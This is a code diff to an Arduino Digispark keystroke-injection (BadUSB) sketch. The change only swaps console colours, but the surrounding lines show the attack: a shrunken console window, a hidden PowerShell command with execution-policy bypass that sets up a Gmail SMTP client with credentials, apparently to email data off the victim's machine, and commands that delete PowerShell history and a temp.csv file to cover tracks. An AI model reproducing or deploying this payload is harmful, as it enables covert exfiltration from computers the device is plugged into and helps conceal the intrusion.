@@ -24,7 +24,7 @@ void setup() {
   DigiKeyboard.print("MODE CON: COLS=15 LINES=5");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
-  DigiKeyboard.print("COLOR EF");
+  DigiKeyboard.print("COLOR 0A");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   DigiKeyboard.delay(500);
@@ -40,7 +40,7 @@ void setup() {
   DigiKeyboard.print("MODE CON: COLS=15 LINES=5");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
-  DigiKeyboard.print("COLOR EF");
+  DigiKeyboard.print("COLOR 0A");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
   DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('"));
@@ -66,7 +66,7 @@ void setup() {
   DigiKeyboard.print("MODE CON: COLS=15 LINES=5");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
-  DigiKeyboard.print("COLOR EF");
+  DigiKeyboard.print("COLOR 0A");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
   DigiKeyboard.print(F("powershell -NoP -NonI -W Hidden -Exec Bypass \"del (Get-PSReadlineOption).HistorySavePath\""));
@@ -80,7 +80,7 @@ void setup() {
   DigiKeyboard.print("MODE CON: COLS=15 LINES=5");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
-  DigiKeyboard.print("COLOR EF");
+  DigiKeyboard.print("COLOR 0A");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(100);
   DigiKeyboard.print(F("del temp.csv"));
